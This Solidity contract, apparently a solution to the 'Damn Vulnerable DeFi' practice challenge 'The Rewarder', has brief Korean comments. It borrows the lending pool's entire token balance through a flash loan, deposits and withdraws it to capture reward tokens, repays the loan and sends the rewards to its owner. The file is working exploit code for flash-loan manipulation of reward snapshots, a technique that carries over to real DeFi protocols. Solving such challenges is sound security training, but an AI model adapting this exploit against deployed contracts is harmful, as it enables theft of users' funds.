
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol"; 
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract RewarderExploit {

    FlashLoanerPool public flashloanAddress;
    DamnValuableToken public liquidityToken;
    TheRewarderPool public theRewarderPool;
    RewardToken public rewardToken;
    address public owner;

    constructor(address _flashloanAddress, address liquidityTokenAddress, address _theRewarderPool,address _rewardToken){
        flashloanAddress = FlashLoanerPool(_flashloanAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function callFlash()external {
        // FlashLoanerPool에 100만 DVT토큰이있음
        uint256 poolDVTBalance = liquidityToken.balanceOf(address(flashloanAddress));
        //flashLoan을하면 RewarderExploit컨트랙트로 DVT토큰이 들어옴 
        flashloanAddress.flashLoan(poolDVTBalance);
    }

    function receiveFlashLoan(uint256 _amount)external {
        liquidityToken.approve(address(theRewarderPool),_amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.withdraw(_amount);
        liquidityToken.transfer(address(flashloanAddress),liquidityToken.balanceOf(address(this)));
        rewardToken.transfer(owner,rewardToken.balanceOf(address(this)));
    }

}